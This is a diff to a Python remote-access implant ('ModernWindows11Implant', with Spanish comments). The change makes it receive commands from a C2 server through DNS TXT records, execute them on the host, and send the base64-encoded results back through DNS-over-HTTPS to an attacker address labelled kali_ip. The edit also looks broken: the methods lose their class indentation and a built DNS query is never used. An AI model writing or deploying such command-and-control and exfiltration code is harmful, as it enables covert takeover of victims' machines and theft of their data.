@@ -672,31 +672,78 @@ class ModernWindows11Implant:
                 error_delay = min(86400, 300 * (2 ** random.randint(1, 5)))
                 time.sleep(error_delay)
     
-    def _process_response(self, response):
-        """Procesa respuesta del C2"""
-        try:
-            if isinstance(response, dict):
-                if 'command' in response:
-                    cmd = response['command']
-                    print(f"[>] Received command: {cmd}")
-                    
-                    result = self.execute_command(cmd)
-                    print(f"[<] Result: {result[:100] if result else 'No result'}")
-                
-                elif 'config' in response:
-                    # Actualizar configuración
-                    new_config = response['config']
-                    
-                    if 'interval' in new_config:
-                        self.beacon_interval = new_config['interval']
-                    
-                    if 'method' in new_config:
-                        self.comm_method = new_config['method']
-                    
-                    print("[*] Configuration updated")
+def _process_response(self, response):
+    """Procesa respuesta del C2"""
+    try:
+        if isinstance(response, bytes):
+            # Decodificar respuesta DNS
+            import dns.message
+            dns_response = dns.message.from_wire(response)
             
-        except:
-            pass
+            # Buscar comandos en respuestas TXT
+            for answer in dns_response.answer:
+                if answer.rdtype == dns.rdatatype.TXT:
+                    for txt_string in answer:
+                        txt_data = str(txt_string)
+                        if txt_data.startswith('cmd:'):
+                            command = txt_data[4:]  # Quitar 'cmd:'
+                            print(f"[>] Received command: {command}")
+                            
+                            # Ejecutar comando
+                            result = self.execute_command(command)
+                            print(f"[<] Result: {result[:200] if result else 'No result'}")
+                            
+                            # Enviar resultado de vuelta al C2
+                            self.send_result(command, result)
+                            
+        elif isinstance(response, dict):
+            # Manejo alternativo
+            if 'command' in response:
+                cmd = response['command']
+                print(f"[>] Received command: {cmd}")
+                
+                result = self.execute_command(cmd)
+                print(f"[<] Result: {result[:100] if result else 'No result'}")
+                
+                self.send_result(cmd, result)
+            
+    except Exception as e:
+        print(f"[!] Error processing response: {e}")
+
+def send_result(self, command, result):
+    """Envía resultado del comando al C2"""
+    try:
+        result_data = {
+            'command': command,
+            'result': result[:10000] if result else "No output",
+            'timestamp': datetime.utcnow().isoformat() + 'Z'
+        }
+        
+        # Codificar y enviar como beacon de resultado
+        encoded = base64.urlsafe_b64encode(
+            json.dumps(result_data).encode()
+        ).decode().replace('=', '')
+        
+        # Enviar vía DoH
+        query_name = f"{encoded[:30]}.result.{self.comms.kali_ip}"
+        
+        # Crear y enviar query DNS
+        import dns.message
+        import dns.query
+        import dns.rdatatype
+        import dns.rdataclass
+        
+        dns_msg = dns.message.make_query(
+            qname=query_name,
+            rdtype=dns.rdatatype.TXT,
+            rdclass=dns.rdataclass.IN
+        )
+        
+        # Usar el mismo método de comunicación
+        self.comms.dns_over_https(result_data)
+        
+    except Exception as e:
+        print(f"[!] Error sending result: {e}")
 
 # ==================== DETECCIÓN DE SEGURIDAD ====================
 class SecurityAwareness:
